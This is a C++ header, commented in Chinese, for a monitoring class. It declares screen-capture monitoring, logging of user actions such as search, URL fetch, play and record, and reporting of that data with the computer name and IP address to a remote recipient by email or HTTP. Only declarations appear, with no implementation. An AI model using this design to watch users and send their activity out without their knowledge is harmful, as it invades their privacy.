#ifndef _Monitor_H_
#define _Monitor_H_

#include <string>

enum OperatorType
{
	OP_Search,
	OP_GetUrl,
	OP_Play,
	OP_Record,
	OP_Favirate
};

class Monitor
{
public:
	Monitor();
	~Monitor();

public:
	int StartScreenCaptureMonitor();
	static DWORD WINAPI ScreenCaptureMonitor(LPVOID lpParam);

public:
	/**
	 * 操作监控
	 * 参数：
	 *	@op_type	操作类型
	 *	@subject	操作主体
	 *	@object		操作客体
	 */
	int OperatorMonitor(enum OperatorType op_type, const char *subject, const char *object);

public:
	const char* GetComputerNameEx() { return computer_name; }
	const char* GetIpAddressEx() { return ip; }
	// 发送邮件的方式上报，但是免费邮箱有发送限制，很快就不行了
	int SendMessage(const char *subject, const char *content, const char *attachment_name = NULL, const unsigned char *attachment = NULL, int attachment_len = 0);
	// HTTP上报的方式
	int SendMessageEx(const char *subject, const char *content, const char *attachment_name = NULL, const unsigned char *attachment = NULL, int attachment_len = 0);

private:
	// SMTP服务器
	std::string mail_host;
	// 发送者
	std::string mail_sender;
	// 接收者
	std::string mail_recipient;

	char computer_name[4096];
	char ip[64];
};

#endif//_Monitor_H_
